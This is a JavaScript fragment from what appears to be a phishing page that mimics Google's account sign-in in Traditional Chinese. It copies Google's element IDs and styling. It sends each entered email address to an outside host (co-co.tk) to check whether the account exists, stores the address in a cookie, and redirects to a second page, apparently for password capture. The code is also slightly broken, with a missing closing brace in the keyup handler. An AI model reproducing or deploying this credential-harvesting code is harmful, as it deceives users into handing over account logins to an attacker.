<script>
	document.getElementById("identifierId").addEventListener("focus", function() {document.getElementById('jjjjjaaaaaooooo').className+=' u3bW4e';});

	var ddddd = "null";
	document.getElementById("identifierId").focus();
	document.getElementById("identifierId").addEventListener("keyup", function(event) {
		event.preventDefault();
			if (event.keyCode === 13) {
				document.getElementById("identifierNext").click();

	});
	function callto() {
		if(!document.getElementById("identifierId").value) {
			document.getElementById("jjjjjaaaaaooooo").className += " k0tWj IYewr";
			document.getElementById("DDFo").innerHTML = "請輸入電子郵件地址或電話號碼";
		} else {
			ddddd = document.getElementById("identifierId").value;
			var xhttp = new XMLHttpRequest();
				xhttp.onreadystatechange = function() {
					if(this.readyState == 4 && this.status == 200) {
						if(this.responseText=="Y") {
							cango();
						} else {
							document.getElementById("jjjjjaaaaaooooo").className += " k0tWj IYewr";
							document.getElementById("DDFo").innerHTML = "找不到您的 Google 帳戶";
						}
					}
				};
			xhttp.open("GET", "https://co-co.tk/test/GoogleCheck/?email="+ddddd, true);
			xhttp.send();
		}
	}
	function urldata(key) {
        var u = location.href;
        var n = key.length;
        var i = u.search(key)+n+1;
        var a = "";
        while(u.charAt(i)!=""&&u.charAt(i)!="&") {
            a += u.charAt(i);
            ++i;
        }
        if(u.search(key)==-1) {return -1;}
        return a;
    }
	function cango() {
		Cookies.set('email', ddddd);
		if(!urldata("redirect")) {
			window.location.href="./GLogin2";
		} else {
			window.location.href="./GLogin2?redirect="+urldata("redirect");
		}
	}
